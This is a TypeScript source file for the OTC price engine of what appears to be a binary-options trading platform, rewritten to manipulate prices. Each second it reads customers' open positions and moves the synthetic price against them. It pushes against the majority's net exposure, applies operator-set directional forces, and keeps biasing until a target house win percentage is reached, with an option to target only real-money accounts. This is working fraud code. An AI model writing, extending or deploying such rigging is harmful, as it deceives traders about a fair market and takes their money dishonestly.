// ============================================================================
// OTC ENGINE COM MANIPULACAO - SUBSTITUI: apps/api/src/market-data/otc/engine.ts
// ============================================================================
// Alteracoes em relacao ao original:
//   1. Carrega config de manipulacao da tabela app_config a cada 10s
//   2. Aplica forca direcional por ativo (asset_forces)
//   3. Aplica vies de volume (volume_manipulation)
//   4. Aplica house_win_pct contra ordens abertas
// ============================================================================

import { prisma } from '../../prisma.js'
import { redis, redisPub, KEYS } from '../../redis.js'
import { nextPrice } from './rng.js'
import { isOtcSessionOpen } from './session.js'

const TIMEFRAMES = [5, 15, 60, 300]
const CANDLE_BUFFER_SIZE = 500

type AssetState = {
  id:           string
  symbol:       string
  basePrice:    number
  volatility:   number
  trend:        number
  decimals:     number
  price:        number
  sessionStart: string | null
  sessionEnd:   string | null
  active:       boolean
  keepAlive:    boolean
  candles:      Map<number, CandleState>
}

type CandleState = {
  openTime: number
  open:     number
  high:     number
  low:      number
  close:    number
}

// ── Manipulation state ──────────────────────────────────────────────────────
type ManipulationConfig = {
  manipulation_enabled: boolean
  manipulation_mode: string       // 'all' | 'real_only' | 'demo_only'
  house_win_pct: number           // 50-95, porcentagem de win da casa
  volume_manipulation_enabled: boolean
  volume_manipulation_strength: number
  asset_forces: Record<string, {
    direction: 'buy' | 'sell'
    strength: number
    expires_at: string
  }>
}

const defaultManipConfig: ManipulationConfig = {
  manipulation_enabled: false,
  manipulation_mode: 'all',
  house_win_pct: 55,
  volume_manipulation_enabled: false,
  volume_manipulation_strength: 1,
  asset_forces: {},
}

let manipConfig: ManipulationConfig = { ...defaultManipConfig }

// Net exposure per symbol: positive = net CALL, negative = net PUT
let netExposure: Map<string, number> = new Map()

// Open positions per symbol with direction info (for house_win_pct)
type OpenPosition = {
  direction: 'CALL' | 'PUT'
  entryPrice: number
  amount: number
  accountType: string
}
let openPositions: Map<string, OpenPosition[]> = new Map()

// ── Core state ──────────────────────────────────────────────────────────────
const state = new Map<string, AssetState>()
let running = false
let timer: NodeJS.Timeout | null = null

function alignWindow(epochSec: number, tf: number): number {
  return Math.floor(epochSec / tf) * tf
}

function round(value: number, decimals: number): number {
  const m = Math.pow(10, decimals)
  return Math.round(value * m) / m
}

function isTicking(a: AssetState, at: Date): boolean {
  return (a.active && isOtcSessionOpen(a.sessionStart, a.sessionEnd, at)) || a.keepAlive
}

async function symbolsWithOpenPositions(): Promise<Set<string>> {
  try {
    const rows = await prisma.$queryRawUnsafe<Array<{ asset_id: string; asset_symbol: string }>>(
      `SELECT DISTINCT o.asset_id, o.asset_symbol
         FROM operations o
        WHERE o.status = 'OPEN'`,
    )
    const out = new Set<string>()
    for (const r of rows) {
      if (r.asset_id)     out.add(r.asset_id)
      if (r.asset_symbol) out.add(r.asset_symbol.toUpperCase())
    }
    return out
  } catch (e: any) {
    console.error('[otc-engine] symbolsWithOpenPositions:', e.message)
    return new Set()
  }
}

// ── Load manipulation config from app_config ────────────────────────────────
async function loadManipulationConfig() {
  try {
    const rows = await prisma.$queryRawUnsafe<Array<{ key: string; value: any }>>(
      `SELECT key, value FROM app_config WHERE key IN (
        'manipulation_enabled', 'manipulation_mode', 'house_win_pct',
        'volume_manipulation_enabled', 'volume_manipulation_strength',
        'asset_forces'
      )`
    )
    const cfg: Record<string, any> = {}
    for (const r of rows) cfg[r.key] = r.value

    manipConfig = {
      manipulation_enabled: cfg.manipulation_enabled ?? false,
      manipulation_mode: cfg.manipulation_mode ?? 'all',
      house_win_pct: cfg.house_win_pct ?? 55,
      volume_manipulation_enabled: cfg.volume_manipulation_enabled ?? false,
      volume_manipulation_strength: cfg.volume_manipulation_strength ?? 1,
      asset_forces: cfg.asset_forces ?? {},
    }
  } catch (e: any) {
    console.error('[otc-engine] loadManipulationConfig:', e.message)
  }
}

// ── Load net exposure and open positions per symbol ─────────────────────────
async function loadExposureData() {
  try {
    const rows = await prisma.$queryRawUnsafe<Array<{
      asset_symbol: string
      direction: string
      total_amount: number
      account_type: string
      entry_price: number
    }>>(
      `SELECT o.asset_symbol, o.direction,
              SUM(o.amount::numeric) as total_amount,
              a.type as account_type,
              o.entry_price::numeric as entry_price
       FROM operations o
       JOIN accounts a ON a.id = o.account_id
       WHERE o.status = 'OPEN'
       GROUP BY o.asset_symbol, o.direction, a.type, o.entry_price`
    )

    const exposure = new Map<string, number>()
    const positions = new Map<string, OpenPosition[]>()

    for (const r of rows) {
      const symbol = r.asset_symbol.toUpperCase()
      const current = exposure.get(symbol) ?? 0
      const amount = Number(r.total_amount)

      // Net exposure: CALL adds, PUT subtracts
      if (r.direction === 'CALL') {
        exposure.set(symbol, current + amount)
      } else {
        exposure.set(symbol, current - amount)
      }

      // Track individual positions
      if (!positions.has(symbol)) positions.set(symbol, [])
      positions.get(symbol)!.push({
        direction: r.direction as 'CALL' | 'PUT',
        entryPrice: Number(r.entry_price),
        amount: amount,
        accountType: r.account_type,
      })
    }

    netExposure = exposure
    openPositions = positions
  } catch (e: any) {
    console.error('[otc-engine] loadExposureData:', e.message)
  }
}

// ── Calculate manipulation bias for a tick ───────────────────────────────────
function calculateManipulationBias(asset: AssetState): number {
  if (!manipConfig.manipulation_enabled) return 0

  let totalBias = 0

  // 1. ASSET FORCES: Direct force on specific assets
  const force = manipConfig.asset_forces[asset.symbol]
  if (force) {
    const expiresAt = new Date(force.expires_at)
    if (expiresAt > new Date()) {
      // Apply directional bias: buy = push price up, sell = push price down
      const direction = force.direction === 'buy' ? 1 : -1
      const magnitude = asset.volatility * asset.price * force.strength * 0.5
      totalBias += direction * magnitude
    }
  }

  // 2. VOLUME MANIPULATION: Move against net exposure
  if (manipConfig.volume_manipulation_enabled) {
    const exposure = netExposure.get(asset.symbol) ?? 0
    if (Math.abs(exposure) > 0) {
      // If net CALL (positive exposure) > 0, push price DOWN (against majority)
      // If net PUT (negative exposure) < 0, push price UP (against majority)
      const antiDirection = exposure > 0 ? -1 : 1
      const strength = manipConfig.volume_manipulation_strength
      const magnitude = asset.volatility * asset.price * strength * 0.3
      // Scale by exposure amount (normalized)
      const exposureScale = Math.min(Math.abs(exposure) / 1000, 3) // cap at 3x
      totalBias += antiDirection * magnitude * exposureScale
    }
  }

  // 3. HOUSE WIN RATE: Bias against open positions to achieve target win rate
  const positions = openPositions.get(asset.symbol)
  if (positions && positions.length > 0) {
    // Check if manipulation applies to these account types
    const mode = manipConfig.manipulation_mode
    const relevantPositions = positions.filter(p => {
      if (mode === 'all') return true
      if (mode === 'real_only') return p.accountType === 'REAL'
      if (mode === 'demo_only') return p.accountType === 'DEMO'
      return true
    })

    if (relevantPositions.length > 0) {
      // Count positions currently winning vs losing
      let winningAmount = 0
      let losingAmount = 0
      for (const pos of relevantPositions) {
        const isWinning =
          (pos.direction === 'CALL' && asset.price > pos.entryPrice) ||
          (pos.direction === 'PUT'  && asset.price < pos.entryPrice)
        if (isWinning) winningAmount += pos.amount
        else losingAmount += pos.amount
      }

      const totalAmount = winningAmount + losingAmount
      if (totalAmount > 0) {
        const currentHouseWinRate = losingAmount / totalAmount
        const targetHouseWinRate  = manipConfig.house_win_pct / 100

        // If house is winning less than target, push against majority direction
        if (currentHouseWinRate < targetHouseWinRate) {
          // Determine the dominant direction to push against
          let netCallAmount = 0
          for (const pos of relevantPositions) {
            netCallAmount += pos.direction === 'CALL' ? pos.amount : -pos.amount
          }
          // If more CALL volume, push price DOWN. If more PUT, push UP.
          const antiDir = netCallAmount > 0 ? -1 : 1
          const deficit = targetHouseWinRate - currentHouseWinRate
          const magnitude = asset.volatility * asset.price * deficit * 2
          totalBias += antiDir * magnitude
        }
      }
    }
  }

  return totalBias
}

async function loadAssets() {
  const assets = await prisma.otcAsset.findMany()
  const openOn = await symbolsWithOpenPositions()
  const ids    = new Set<string>()

  for (const a of assets) {
    const active     = a.status === 'ACTIVE'
    const keepAlive  = openOn.has(a.id) || openOn.has(a.symbol.toUpperCase())
    if (!active && !keepAlive) continue

    ids.add(a.id)
    const existing = state.get(a.id)
    const basePrice  = Number(a.basePrice)
    const volatility = Number(a.volatility)
    const trend      = Number(a.trend)

    if (existing) {
      existing.basePrice    = basePrice
      existing.volatility   = volatility
      existing.trend        = trend
      existing.decimals     = a.decimals
      existing.sessionStart = a.sessionStartUtc
      existing.sessionEnd   = a.sessionEndUtc
      existing.active       = active
      existing.keepAlive    = keepAlive
    } else {
      const cached = await redis.get(KEYS.price(a.symbol))
      const price  = cached ? Number(cached) : basePrice
      state.set(a.id, {
        id: a.id, symbol: a.symbol, basePrice, volatility, trend,
        decimals: a.decimals, price,
        sessionStart: a.sessionStartUtc, sessionEnd: a.sessionEndUtc,
        active, keepAlive,
        candles: new Map(),
      })
    }
  }

  for (const id of state.keys()) if (!ids.has(id)) state.delete(id)
}

let tickInFlight = false

async function tickOnce() {
  if (tickInFlight) return
  tickInFlight = true

  try {
    const now   = Math.floor(Date.now() / 1000)
    const nowDt = new Date(now * 1000)

    for (const asset of state.values()) {
      if (!isTicking(asset, nowDt)) continue

      // ── Original price generation (sync) ──────────────────────────────
      const seed = `${asset.id}:${now}`
      let raw  = nextPrice({
        currentPrice: asset.price,
        basePrice:    asset.basePrice,
        volatility:   asset.volatility,
        trend:        asset.trend,
        seed,
      })

      // ── MANIPULATION BIAS ─────────────────────────────────────────────
      const bias = calculateManipulationBias(asset)
      if (bias !== 0) {
        raw += bias
        // Ensure price doesn't go below 0 or deviate too far from base
        raw = Math.max(raw, asset.basePrice * 0.5)
        raw = Math.min(raw, asset.basePrice * 1.5)
      }

      asset.price = round(raw, asset.decimals)

      // ── I/O FIRE-AND-FORGET ───────────────────────────────────────────
      const payload = JSON.stringify({ symbol: asset.symbol, price: asset.price, t: now })
      redis.set(KEYS.price(asset.symbol), String(asset.price)).catch(e => console.error('[otc-engine] redis.set:', e.message))
      redisPub.publish(KEYS.tickChannel(asset.symbol), payload).catch(e => console.error('[otc-engine] redis.publish:', e.message))

      // ── Candle aggregation (sync) ─────────────────────────────────────
      for (const tf of TIMEFRAMES) {
        const openTime = alignWindow(now, tf)
        const candle = asset.candles.get(tf)

        if (!candle || candle.openTime !== openTime) {
          if (candle) {
            persistCandle(asset, tf, candle).catch(e => console.error('[otc-engine] persistCandle bg:', e.message))
          }
          asset.candles.set(tf, {
            openTime,
            open:  asset.price,
            high:  asset.price,
            low:   asset.price,
            close: asset.price,
          })
        } else {
          candle.high  = Math.max(candle.high, asset.price)
          candle.low   = Math.min(candle.low,  asset.price)
          candle.close = asset.price
        }
      }
    }
  } finally {
    tickInFlight = false
  }
}

async function persistCandle(asset: AssetState, tf: number, candle: CandleState) {
  try {
    await prisma.otcCandle.upsert({
      where: { assetId_timeframe_openTime: { assetId: asset.id, timeframe: tf, openTime: new Date(candle.openTime * 1000) } },
      create: {
        assetId: asset.id, timeframe: tf,
        openTime: new Date(candle.openTime * 1000),
        open: candle.open, high: candle.high, low: candle.low, close: candle.close,
      },
      update: { high: candle.high, low: candle.low, close: candle.close },
    })

    const key = KEYS.candleBuffer(asset.symbol, tf)
    const serialized = JSON.stringify({
      t: candle.openTime, o: candle.open, h: candle.high, l: candle.low, c: candle.close,
    })
    await redis.zadd(key, candle.openTime, serialized)
    await redis.zremrangebyrank(key, 0, -(CANDLE_BUFFER_SIZE + 1))
  } catch (err: any) {
    console.error(`[otc-engine] persistCandle ${asset.symbol} tf=${tf}:`, err.message)
  }
}

export async function startOtcEngine() {
  if (running) return
  running = true

  await loadAssets()
  await loadManipulationConfig()
  console.log(`[otc-engine] starting with ${state.size} active asset(s), manipulation: ${manipConfig.manipulation_enabled}`)

  // Reload assets every 30s
  const reloadEvery = setInterval(() => {
    loadAssets().catch(e => console.error('[otc-engine] reload:', e.message))
  }, 30_000)

  // Reload manipulation config every 10s
  const manipReload = setInterval(() => {
    loadManipulationConfig().catch(e => console.error('[otc-engine] manip reload:', e.message))
    loadExposureData().catch(e => console.error('[otc-engine] exposure reload:', e.message))
  }, 10_000)

  // Tick every 1s
  timer = setInterval(() => {
    tickOnce().catch(e => console.error('[otc-engine] tick:', e.message))
  }, 1000)

  const stop = () => {
    if (timer) clearInterval(timer)
    clearInterval(reloadEvery)
    clearInterval(manipReload)
    running = false
  }
  process.once('SIGTERM', stop)
  process.once('SIGINT',  stop)
}

export function getCurrentPriceMemory(symbol: string): number | null {
  const at = new Date()
  for (const a of state.values()) {
    if (a.symbol !== symbol) continue
    return isTicking(a, at) ? a.price : null
  }
  return null
}

export function getTickingOtcSymbols(): string[] {
  const at = new Date()
  const out: string[] = []
  for (const a of state.values()) if (isTicking(a, at)) out.push(a.symbol)
  return out
}
